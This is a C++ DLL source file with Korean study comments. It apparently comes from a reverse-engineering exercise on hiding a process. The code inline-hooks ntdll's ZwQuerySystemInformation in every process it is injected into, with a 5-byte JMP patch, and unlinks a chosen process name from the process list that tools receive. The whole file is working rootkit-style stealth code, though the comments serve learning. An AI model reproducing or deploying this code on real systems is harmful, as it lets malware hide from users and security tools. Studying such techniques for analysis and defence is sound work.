/********************
실행 흐름
    HideProc.exe가 모든 프로세스에 dll injection(remotethread)
-> dll이 attach되면서 dll main대로 hook_by_code 호출
-> 5Byte가 hooking.

    프로세스들이 ZwQuery을 호출하면,
->hooking된 대로 NewZwQuery로 JMP
->NewZwQuery는 제대로 ZwQuery를 돌리기 위해 unhook
->NewZwQuery 내부에서 ZwQuery 호출
->ZwQuery 수행 후 NewZwQuery로 나오면서 *return값 반환받음*
->NewZwQuery는 return값을 조작하는 등 본래 목적 작업 수행
->return하기 전 다시 hooking걸고 return(그래야 또 조작할 수 있으니까)

*********************/


#include "main.h"
#include <windows.h>

#define STATUS_SUCCESS (0x00000000L)



/*
The /SECTION option changes the attributes of a section.
Read Write Shared 옵션.
*/
#pragma comment(linker, "/SECTION:.SHARE,RWS")
/*
변수가 어느 섹션에 저장될지를 지정.
원래는 초기화 된 변수는 .data 안된 변수는 .bss지만
여기서 선언된 변수는 인자로 전달한 .share 섹션에 들어가게 됨.
data_seg를 이용하면 dll과 메모리(데이터) 공유가 가능하다.
*/
#pragma data_seg(".SHARE")
char g_szProcName[MAX_PATH] = {0};
#pragma data_seg()

BYTE g_pOrgBytes[5] = {0};

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char szCurProc[MAX_PATH] = {0};
    char *p = NULL;

    GetModuleFileName(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if((p != NULL) && !_stricmp(p+1, "HideProc.exe"))
        return TRUE;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
                         (PROC)NewZwQuerySystemInformation);
/*
이런식으로 함수 이름을 파라미터로 넘기는 건,
함수포인터를 넘기는 거랑 똑같다고 보면 되겠다.
어차피 함수 포인터도 함수 가리키는 거니까
함수의 주소를 넘긴다고 보면 될듯.
함수도 변수처럼 어떤 영역에 선언 및 할당되어 있는 거니까.
*/
            break;

        case DLL_PROCESS_DETACH:
            unhook_by_code("ntdll.dll", "ZwQuerySystemInformation");
            break;
    }
    return TRUE; // succesful
}

BOOL hook_by_code(LPCTSTR szDllName, LPCTSTR szFuncName, PROC pfnNew){
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = {0xE9, 0};
    PBYTE pByte;

    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
    /*인자로 전달한 dll의 func를 funcpointer에 반환받는다.
    이 경우 ntdll.dll의 ZwQuerySystemInformation이지.
    typedef int (FAR WINAPI *FARPROC)();
    C에서 ()는 wildcard같은 느낌으로,
    어떤 파라미터 리스트를 가지는 함수인지 명시되지 않았을 때 쓴다.
    어떤 함수를 인자로 넘기느냐에 따라 파라미터 리스트가 다르니까.
    C++에서는 ()가 파라미터가 없다는 뜻으로 정의되어 있다고 함.
    windef.h보니까 extern C 되어있다.
    */

    //Byte 단위로 건드려야 되니까 Byte 포인터로 받고.
    pByte = (PBYTE)pfnOrg;

    if (pByte[0] == 0xE9)
        return FALSE;

    //5byte patch를 위해 ZwQuery.. 함수 영역 5byte에 W속성 추가
    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    //g_pOrgBytes에 5byte 백업
    memcpy(g_pOrgBytes, pfnOrg, 5);

    //JMP 주소 계산
    //pfnNew는 NewZwQuery를 가리키는 포인터
    /**JMP 명령어의 인자는 절대 주소 값이 아니라,
    현재 위치 기준 상대주소. 따라서 이렇게 구해야한다!!!
    New랑 Org는 절대주소니까. -5는 JMP명령어 자체의 길이*/
    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
    memcpy(&pBuf[1], &dwAddress, 4);

    memcpy(pfnOrg, pBuf, 5);

    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

    return TRUE;

}

BOOL unhook_by_code(LPCTSTR szDllName, LPCTSTR szFuncName){
    FARPROC pfn;
    DWORD dwOldProtect;

    pfn = GetProcAddress(GetModuleHandle(szDllName), szFuncName);

    VirtualProtect((LPVOID)pfn, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pfn, g_pOrgBytes, 5);

    VirtualProtect((LPVOID)pfn, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength){

    NTSTATUS status;
    FARPROC pfn;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
    char szProcName[MAX_PATH] = {0};

    unhook_by_code("ntdll.dll", "ZwQuerySystemInformation");


    pfn = GetProcAddress(GetModuleHandle("ntdll.dll"),
                         "ZwQuerySystemInformation");
/*
pfn을 이용해 ZwQuerySystemInformation을 호출.
바로 ZwQuery --JMP--> NewZwQuery하기 때문에
ZwQuery를 call할 때 stack에 넣어놓은 파라미터가 그대로 있다.
그래서 그 파라미터들이 NewZwQuery에도 그대로 적용되고,
이 파라미터들을 이용해 다시 ZwQuery를 호출.
즉 프로세스가 호출한 내용 그대로 가는 것.
*/
    status = ((PFZWQUERYSYSTEMINFORMATION)pfn)(
                    SystemInformationClass, SystemInformation,
                    SystemInformationLength, ReturnLength);

    //ZwQuery함수 실패시 그냥 END로 간다.
    if( status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFOMATION_END;

/**프로세스가 호출될 때 인자로 받은 SystemInformationClass 값이
SystemProcessInformation 일 경우에만 작업한다.
즉 ZwQuery를 호출한 여러 목적중에 프로세스 리스트를 얻으려는
호출만 대상으로 작업을 하는 것.

SystemInformationClass는 IN,
SystemInformation은 PVOID type으로 INOUT이다.
pfn으로 ZwQuery 호출했을 때, SystemInformation에
single linked list가 저장된다!
이 값을 조작해야함.
*/

    if( SystemInformationClass == SystemProcessInformation){
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while(1){
        /*multibyte는 어떤건 1byte 어떤건 2byte ANSI
        widechar는 모두 2바이트 UNICODE(UTF-16)
        CP_ACP는 system 기본 code page(ANSI)를
        conversion에 이용하겠다는 옵션
        code page란 문자에 대응되는 값을 가진 table이다.
        UTF나 ANSI같은게 code page임.
        pCur->Reserved2[1]가 input,
        szProcName이 output이다.
        */
            WideCharToMultiByte(CP_ACP, 0,
                        (PWSTR)pCur->Reserved2[1], -1,
                        szProcName, MAX_PATH, NULL, NULL);
        /*
        g_szProcName는 은폐 프로세스
        szProcName은 연결리스트에서 얻은 프로세스
        pCur = pCur + pCur->NextEntryOffset
         같은 과정으로 하나씩 읽어나간다.
        */

            if(!_strcmpi(szProcName, g_szProcName)){
                /**
                실질적으로 hide하는 부분이 여기.
                은폐 프로세스가 리스트의 마지막에 있을 경우가 if
                else가 중간에 있을경우.
                Offset을 조작해 list에서 건너뛰도록 만든다.
                */
                if(pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
            }
            else
                pPrev = pCur;//포인터니까 list는 변경 없음.

            if(pCur->NextEntryOffset == 0)
                break;

            pCur = (PSYSTEM_PROCESS_INFORMATION)
            ((ULONG)pCur + pCur->NextEntryOffset);
        }

    }

    //소멸자같은거인듯.
__NTQUERYSYSTEMINFOMATION_END:

     hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
                     (PROC)NewZwQuerySystemInformation);

     return status;
}

void DLL_EXPORT SetProcName(LPCTSTR szProcName){
    strcpy_s(g_szProcName, szProcName);
}
